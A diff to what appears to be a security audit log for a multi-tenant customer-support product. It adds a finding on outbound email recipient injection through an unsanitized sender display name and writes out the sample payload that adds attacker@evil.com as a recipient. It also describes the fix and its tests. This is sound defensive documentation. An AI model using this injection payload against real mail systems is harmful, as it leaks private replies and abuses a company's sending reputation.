@@ -302,10 +302,29 @@ isolation check above, swept four known classes:
   debrief) — same private-output + JSON-validated + same-tenant containment, same
   low ceiling; the live cue got the explicit boundary as the highest-exposure one.
 
-Net (10 classes): 4 real hardenings shipped (0088 definer search_path + the `.or()`
-injection guard + the SSRF guard + the cue prompt-injection boundary), 6 verified
-clean. Not an exhaustive pentest — the highest-leverage classes for a multi-tenant
-first-customer launch.
+- **Outbound email recipient injection (2026-07-07 extension) — 🟠 MEDIUM, FIXED.**
+  The HIGHEST-severity finding of the session. The C.A.R.E inbound endpoint is
+  PUBLIC (anyone can email support); the sender's From display name is stored
+  verbatim as the customer name (`inbound/email/route.ts:189`, unsanitized). The
+  outbound reply built Postmark's `To` as `"${customer.name}" <${customer.email}>`,
+  and Postmark's To/From/Cc fields accept a COMMA-SEPARATED ADDRESS LIST — so a
+  name containing `"` closes the quoted display-string early and injects a
+  recipient (`FromName = 'X" <attacker@evil.com>, "Y'` → the agent's reply is also
+  delivered to attacker@evil.com, from the company's trusted sending domain).
+  Reachable, and it leaks the reply + abuses sending reputation. Verified END-TO-
+  END: the address part is SAFE (`body.From` is `z.string().email()`-validated,
+  `customerEmail = body.From.toLowerCase()`), so only the NAME is attacker-
+  controlled — the fix sanitizes names, trusts validated addresses. FIXED
+  (`4d2d3e8`) as a class (§A13): `sanitizeEmailDisplayName` strips the RFC 5322
+  quoted-string break-out chars (`"` `\\`), angle brackets, and CR/LF/control
+  chars; `formatEmailAddress` applied to BOTH To and From. Pinned by
+  `sanitizeHeader.test.ts` (8 tests incl. the exact payload → single-recipient
+  assertion).
+
+Net (11 classes): 5 real hardenings shipped (0088 definer search_path + the `.or()`
+injection guard + the SSRF guard + the cue prompt-injection boundary + the outbound
+email recipient-injection fix — the one MEDIUM), 6 verified clean. Not an exhaustive
+pentest — the highest-leverage classes for a multi-tenant first-customer launch.
 
 **§A6 / §3.2 — task Understanding Gate is UI-enforced, not structural (LOW, founder's
 call).** THINK-first audit of the Tasks (Operations) surface: the problems gate is
